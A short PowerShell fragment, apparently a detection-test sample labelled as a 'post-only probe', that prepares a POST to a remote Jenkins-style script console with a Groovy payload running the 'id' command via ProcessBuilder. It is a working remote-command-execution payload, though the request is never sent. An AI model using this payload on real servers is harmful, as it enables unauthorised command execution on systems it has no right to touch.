# Post-only probe without result harvesting: no harvest conviction.
$url = 'http://'+$Rhost+':8080'+'/script'
$postdata = 'script=println+new+ProcessBuilder%28%27id%27%29.text&Submit=Run'
$webrequest.Method = 'POST'
